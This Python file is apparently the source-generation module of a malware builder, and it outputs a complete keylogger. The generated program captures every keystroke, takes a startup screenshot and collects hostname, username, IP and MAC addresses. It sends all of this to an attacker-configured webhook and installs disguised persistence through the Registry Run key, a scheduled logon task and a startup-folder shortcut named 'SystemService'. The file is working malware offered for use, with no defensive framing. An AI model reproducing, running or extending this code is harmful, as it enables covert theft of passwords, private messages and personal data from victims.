"""
Source code generation for the malware builder.
"""

import sys
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from config.settings import BuilderConfig


class SourceGenerator:
    """Generates keylogger source code based on configuration."""
    
    def __init__(self, config: 'BuilderConfig'):
        self.config = config
        
    def generate_source_code(self) -> str:
        """Generate the keylogger source code based on selected features."""
        code = []
        
        # Imports
        code.append("import os")
        code.append("import sys")
        code.append("import time")
        code.append("import json")
        code.append("import threading")
        code.append("import platform")
        code.append("import socket")
        code.append("import subprocess")
        code.append("from datetime import datetime")
        
        if self.config.features['log_to_file']:
            code.append("import tempfile")
            
        if self.config.features['webhook_exfiltration']:
            code.append("import requests")
            
        if self.config.features['persistence']:
            code.append("import winreg")
            
        if self.config.features['system_info_collection'] or self.config.features['startup_screenshot']:
            code.append("import psutil")
            
        if self.config.features['startup_screenshot']:
            code.append("from PIL import ImageGrab")
            code.append("import io")
            code.append("import base64")
            
        code.append("from pynput import keyboard")
        code.append("")
        
        # System information collection function
        if self.config.features['system_info_collection']:
            code.append("def get_system_info():")
            code.append("    \"\"\"Collect comprehensive system information.\"\"\"")
            code.append("    try:")
            code.append("        # Basic system info")
            code.append("        hostname = socket.gethostname()")
            code.append("        username = os.getenv('USERNAME', 'Unknown')")
            code.append("        os_info = platform.system() + ' ' + platform.release()")
            code.append("        architecture = platform.architecture()[0]")
            code.append("        processor = platform.processor()")
            code.append("")
            code.append("        # Network information")
            code.append("        local_ip = 'Unknown'")
            code.append("        public_ip = 'Unknown'")
            code.append("        mac_address = 'Unknown'")
            code.append("        try:")
            code.append("            # Get local IP")
            code.append("            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)")
            code.append("            s.connect(('8.8.8.8', 80))")
            code.append("            local_ip = s.getsockname()[0]")
            code.append("            s.close()")
            code.append("        except:")
            code.append("            pass")
            code.append("")
            code.append("        try:")
            code.append("            # Get public IP")
            code.append("            response = requests.get('https://api.ipify.org', timeout=5)")
            code.append("            public_ip = response.text")
            code.append("        except:")
            code.append("            pass")
            code.append("")
            code.append("        try:")
            code.append("            # Get MAC address")
            code.append("            mac = psutil.net_if_addrs()")
            code.append("            for interface, addresses in mac.items():")
            code.append("                for addr in addresses:")
            code.append("                    if addr.family == socket.AF_LINK:")
            code.append("                        mac_address = addr.address")
            code.append("                        break")
            code.append("                if mac_address != 'Unknown':")
            code.append("                    break")
            code.append("        except:")
            code.append("            pass")
            code.append("")
            code.append("        # Hardware information")
            code.append("        memory = psutil.virtual_memory()")
            code.append("        disk = psutil.disk_usage('/')")
            code.append("        cpu_count = psutil.cpu_count()")
            code.append("        cpu_percent = psutil.cpu_percent(interval=1)")
            code.append("")
            code.append("        # System uptime")
            code.append("        boot_time = datetime.fromtimestamp(psutil.boot_time())")
            code.append("        uptime = datetime.now() - boot_time")
            code.append("")
            code.append("        # Running processes count")
            code.append("        process_count = len(psutil.pids())")
            code.append("")
            code.append("        system_info = {")
            code.append("            'basic_info': {")
            code.append("                'hostname': hostname,")
            code.append("                'username': username,")
            code.append("                'os': os_info,")
            code.append("                'architecture': architecture,")
            code.append("                'processor': processor")
            code.append("            },")
            code.append("            'network_info': {")
            code.append("                'local_ip': local_ip,")
            code.append("                'public_ip': public_ip,")
            code.append("                'mac_address': mac_address")
            code.append("            },")
            code.append("            'hardware_info': {")
            code.append("                'memory_total_gb': round(memory.total / (1024**3), 2),")
            code.append("                'memory_available_gb': round(memory.available / (1024**3), 2),")
            code.append("                'memory_percent': memory.percent,")
            code.append("                'disk_total_gb': round(disk.total / (1024**3), 2),")
            code.append("                'disk_free_gb': round(disk.free / (1024**3), 2),")
            code.append("                'disk_percent': round((disk.used / disk.total) * 100, 2),")
            code.append("                'cpu_count': cpu_count,")
            code.append("                'cpu_percent': cpu_percent")
            code.append("            },")
            code.append("            'system_status': {")
            code.append("                'boot_time': boot_time.strftime('%Y-%m-%d %H:%M:%S'),")
            code.append("                'uptime_days': uptime.days,")
            code.append("                'uptime_hours': uptime.seconds // 3600,")
            code.append("                'process_count': process_count")
            code.append("            }")
            code.append("        }")
            code.append("        return system_info")
            code.append("    except Exception as e:")
            code.append("        return {'error': str(e)}")
            code.append("")
        
        # Screenshot function
        if self.config.features['startup_screenshot']:
            code.append("def take_screenshot():")
            code.append("    \"\"\"Take a screenshot and return as base64 string.\"\"\"")
            code.append("    try:")
            code.append("        screenshot = ImageGrab.grab()")
            code.append("        img_buffer = io.BytesIO()")
            code.append("        screenshot.save(img_buffer, format='PNG')")
            code.append("        img_str = base64.b64encode(img_buffer.getvalue()).decode()")
            code.append("        return img_str")
            code.append("    except Exception as e:")
            code.append("        return None")
            code.append("")
        
        # Main class
        code.append("class Keylogger:")
        code.append("    def __init__(self):")
        code.append("        self.log = []")
        code.append("        self.running = False")
        code.append("        self.startup_completed = False")
        
        if self.config.features['log_to_file']:
            code.append("        self.log_file = os.path.join(tempfile.gettempdir(), 'system_log.txt')")
            
        if self.config.features['webhook_exfiltration']:
            code.append(f"        self.webhook_url = '{self.config.settings['webhook_url']}'")
            
        code.append(f"        self.flush_interval = {self.config.settings['flush_interval']}")
        code.append("        self.flush_thread = None")
        code.append("")
        
        # Key press handler
        code.append("    def on_key_press(self, key):")
        code.append("        try:")
        code.append("            key_char = key.char")
        code.append("        except AttributeError:")
        code.append("            key_char = str(key)")
        code.append("")
        code.append("        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')")
        code.append("        log_entry = f'[{timestamp}] {key_char}'")
        code.append("        self.log.append(log_entry)")
        code.append("")
        
        # Flush method
        code.append("    def flush_logs(self):")
        code.append("        if not self.log:")
        code.append("            return")
        code.append("")
        code.append("        log_data = '\\n'.join(self.log)")
        code.append("        self.log.clear()")
        code.append("")
        
        if self.config.features['log_to_file']:
            code.append("        # Write to file")
            code.append("        try:")
            code.append("            with open(self.log_file, 'a', encoding='utf-8') as f:")
            code.append("                f.write(log_data + '\\n')")
            code.append("        except Exception as e:")
            code.append("            pass")
            code.append("")
            
        if self.config.features['webhook_exfiltration']:
            code.append("        # Send to webhook")
            code.append("        try:")
            code.append("            # Enhanced webhook formatting")
            code.append("            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')")
            code.append("            embed = {")
            code.append("                'title': '[KEY] Keylogger Activity Detected',")
            code.append("                'description': f'New keystroke data captured at {timestamp}',")
            code.append("                'color': 0xFF0000,")
            code.append("                'fields': [")
            code.append("                    {")
            code.append("                        'name': '[DATA] Keystroke Data',")
            code.append("                        'value': f'```\\n{log_data}\\n```',")
            code.append("                        'inline': False")
            code.append("                    }")
            code.append("                ],")
            code.append("                'timestamp': datetime.now().isoformat()")
            code.append("            }")
            code.append("            payload = {'embeds': [embed]}")
            code.append("            requests.post(self.webhook_url, json=payload, timeout=5)")
            code.append("        except Exception as e:")
            code.append("            pass")
            code.append("")
            
        # Flush thread
        code.append("    def flush_thread_worker(self):")
        code.append("        while self.running:")
        code.append("            time.sleep(self.flush_interval)")
        code.append("            self.flush_logs()")
        code.append("")
        
        # Startup method
        code.append("    def send_startup_data(self):")
        code.append("        \"\"\"Send system info and screenshot on startup.\"\"\"")
        code.append("        if self.startup_completed:")
        code.append("            return")
        code.append("")
        code.append("        try:")
        code.append("            startup_data = {}")
        code.append("            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')")
        code.append("")
        if self.config.features['system_info_collection']:
            code.append("            # Collect system information")
            code.append("            system_info = get_system_info()")
            code.append("            startup_data['system_info'] = system_info")
            code.append("")
        if self.config.features['startup_screenshot']:
            code.append("            # Take screenshot")
            code.append("            screenshot_data = take_screenshot()")
            code.append("            if screenshot_data:")
            code.append("                startup_data['screenshot'] = screenshot_data")
            code.append("")
        code.append("            startup_data['timestamp'] = timestamp")
        code.append("            startup_data['event'] = 'startup'")
        code.append("")
        code.append("            # Send startup data via webhook")
        code.append("            if self.webhook_url and startup_data:")
        code.append("                # Test webhook connection first")
        code.append("                try:")
        code.append("                    test_data = {'content': '[TEST] Webhook connection test - Keylogger startup detected'}")
        code.append("                    requests.post(self.webhook_url, json=test_data, timeout=5)")
        code.append("                except Exception as e:")
        code.append("                    pass  # Continue anyway")
        code.append("")
        code.append("                # Create main embed for system info")
        code.append("                embed = {")
        code.append("                    'title': '[START] Keylogger Started',")
        code.append("                    'description': f'Keylogger initialized at {timestamp}',")
        code.append("                    'color': 0x00FF00,")
        code.append("                    'fields': []")
        code.append("                }")
        code.append("")
        if self.config.features['system_info_collection']:
            code.append("                # Add system info to embed")
            code.append("                if 'system_info' in startup_data and 'error' not in startup_data['system_info']:")
            code.append("                    sys_info = startup_data['system_info']")
            code.append("                    basic = sys_info.get('basic_info', {})")
            code.append("                    network = sys_info.get('network_info', {})")
            code.append("                    hardware = sys_info.get('hardware_info', {})")
            code.append("                    status = sys_info.get('system_status', {})")
            code.append("")
            code.append("                    embed['fields'].extend([")
            code.append("                        {'name': '[SYS] System Info', 'value': f\"Hostname: {basic.get('hostname', 'Unknown')}\\nUsername: {basic.get('username', 'Unknown')}\\nOS: {basic.get('os', 'Unknown')}\", 'inline': True},")
            code.append("                        {'name': '[NET] Network Info', 'value': f\"Local IP: {network.get('local_ip', 'Unknown')}\\nPublic IP: {network.get('public_ip', 'Unknown')}\\nMAC: {network.get('mac_address', 'Unknown')}\", 'inline': True},")
            code.append("                        {'name': '[HW] Hardware Info', 'value': f\"RAM: {hardware.get('memory_total_gb', 0)}GB ({hardware.get('memory_percent', 0)}% used)\\nDisk: {hardware.get('disk_total_gb', 0)}GB ({hardware.get('disk_percent', 0)}% used)\\nCPU: {hardware.get('cpu_count', 0)} cores ({hardware.get('cpu_percent', 0)}%)\", 'inline': True},")
            code.append("                        {'name': '[STATUS] System Status', 'value': f\"Uptime: {status.get('uptime_days', 0)} days, {status.get('uptime_hours', 0)} hours\\nProcesses: {status.get('process_count', 0)}\\nBoot: {status.get('boot_time', 'Unknown')}\", 'inline': True}")
            code.append("                    ])")
        code.append("")
        code.append("                embed['timestamp'] = datetime.now().isoformat()")
        code.append("                payload = {'embeds': [embed]}")
        code.append("                requests.post(self.webhook_url, json=payload, timeout=10)")
        code.append("")
        if self.config.features['startup_screenshot']:
            code.append("                # Send screenshot as separate message")
            code.append("                if 'screenshot' in startup_data:")
            code.append("                    try:")
            code.append("                        # Send screenshot as file attachment")
            code.append("                        screenshot_bytes = base64.b64decode(startup_data['screenshot'])")
            code.append("                        files = {'file': ('screenshot.png', screenshot_bytes, 'image/png')}")
            code.append("                        data = {'content': '[SCREEN] Screenshot captured on startup'}")
            code.append("                        requests.post(self.webhook_url, data=data, files=files, timeout=10)")
            code.append("                    except Exception as e:")
            code.append("                        # Fallback: send as text")
            code.append("                        data = {'content': '[SCREEN] Screenshot captured but failed to upload'}")
            code.append("                        requests.post(self.webhook_url, json=data, timeout=5)")
        code.append("")
        code.append("            self.startup_completed = True")
        code.append("        except Exception as e:")
        code.append("            # Debug: log error if debug mode is enabled")
        code.append("            if hasattr(self, 'debug_mode') and self.debug_mode:")
        code.append("                print(f'Startup data error: {e}')")
        code.append("            pass")
        code.append("")
        
        # Start method
        code.append("    def keylogger_start(self):")
        code.append("        # Send startup data first")
        code.append("        self.send_startup_data()")
        code.append("")
        code.append("        self.running = True")
        code.append("        self.flush_thread = threading.Thread(target=self.flush_thread_worker)")
        code.append("        self.flush_thread.daemon = True")
        code.append("        self.flush_thread.start()")
        code.append("")
        code.append("        with keyboard.Listener(on_press=self.on_key_press) as listener:")
        code.append("            listener.join()")
        code.append("")
        
        # Stop method
        code.append("    def keylogger_stop(self):")
        code.append("        self.running = False")
        code.append("        if self.flush_thread:")
        code.append("            self.flush_thread.join()")
        code.append("        self.flush_logs()")
        code.append("")
        
        # Persistence methods
        if self.config.features['persistence']:
            code.append("    def install_persistence(self):")
            code.append("        try:")
            
            if self.config.persistence_options['registry_run']:
                code.append("            # Registry persistence")
                code.append("            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 'Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run')")
                code.append("            winreg.SetValueEx(key, 'SystemService', 0, winreg.REG_SZ, sys.argv[0])")
                code.append("            winreg.CloseKey(key)")
                code.append("")
                
            if self.config.persistence_options['task_scheduler']:
                code.append("            # Task Scheduler persistence")
                code.append("            task_xml = f'''<?xml version=\"1.0\" encoding=\"UTF-16\"?>")
                code.append("            <Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">")
                code.append("              <Triggers>")
                code.append("                <LogonTrigger>")
                code.append("                  <Enabled>true</Enabled>")
                code.append("                </LogonTrigger>")
                code.append("              </Triggers>")
                code.append("              <Principals>")
                code.append("                <Principal id=\"Author\">")
                code.append("                  <RunLevel>HighestAvailable</RunLevel>")
                code.append("                </Principal>")
                code.append("              </Principals>")
                code.append("              <Settings>")
                code.append("                <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>")
                code.append("                <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>")
                code.append("                <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>")
                code.append("                <AllowHardTerminate>false</AllowHardTerminate>")
                code.append("                <StartWhenAvailable>false</StartWhenAvailable>")
                code.append("                <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>")
                code.append("                <IdleSettings>")
                code.append("                  <StopOnIdleEnd>false</StopOnIdleEnd>")
                code.append("                  <RestartOnIdle>false</RestartOnIdle>")
                code.append("                </IdleSettings>")
                code.append("                <AllowStartOnDemand>true</AllowStartOnDemand>")
                code.append("                <Enabled>true</Enabled>")
                code.append("                <Hidden>false</Hidden>")
                code.append("                <RunOnlyIfIdle>false</RunOnlyIfIdle>")
                code.append("                <WakeToRun>false</WakeToRun>")
                code.append("                <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>")
                code.append("                <Priority>7</Priority>")
                code.append("              </Settings>")
                code.append("              <Actions Context=\"Author\">")
                code.append("                <Exec>")
                code.append(f"                  <Command>{sys.argv[0]}</Command>")
                code.append("                </Exec>")
                code.append("              </Actions>")
                code.append("            </Task>'''")
                code.append("            with open('task.xml', 'w') as f:")
                code.append("                f.write(task_xml)")
                code.append("            subprocess.run(['schtasks', '/create', '/tn', 'SystemService', '/xml', 'task.xml', '/f'], capture_output=True)")
                code.append("            os.remove('task.xml')")
                code.append("")
                
            if self.config.persistence_options['startup_shortcut']:
                code.append("            # Startup folder shortcut")
                code.append("            startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')")
                code.append("            shortcut_path = os.path.join(startup_path, 'SystemService.lnk')")
                code.append("            vbs_script = f'''")
                code.append("            Set WshShell = WScript.CreateObject(\"WScript.Shell\")")
                code.append("            Set shortcut = WshShell.CreateShortcut(\"{shortcut_path}\")")
                code.append("            shortcut.TargetPath = \"{sys.argv[0]}\"")
                code.append("            shortcut.WorkingDirectory = \"{os.path.dirname(sys.argv[0])}\"")
                code.append("            shortcut.Save")
                code.append("            '''")
                code.append("            with open('create_shortcut.vbs', 'w') as f:")
                code.append("                f.write(vbs_script)")
                code.append("            subprocess.run(['cscript', 'create_shortcut.vbs'], capture_output=True)")
                code.append("            os.remove('create_shortcut.vbs')")
                code.append("")
                
            code.append("        except Exception as e:")
            code.append("            pass")
            code.append("")
            
        # Main execution
        code.append("if __name__ == '__main__':")
        code.append("    try:")
        if self.config.features['debug_mode']:
            code.append("        print('Keylogger started in debug mode...')")
            
        if self.config.features['persistence']:
            code.append("        keylogger = Keylogger()")
            code.append("        keylogger.install_persistence()")
            code.append("        keylogger.keylogger_start()")
        else:
            code.append("        keylogger = Keylogger()")
            code.append("        keylogger.keylogger_start()")
        code.append("    except Exception as e:")
        if self.config.features['debug_mode']:
            code.append("        print(f'Error: {e}')")
            code.append("        input('Press Enter to exit...')")
        code.append("        pass")
            
        return "\n".join(code) 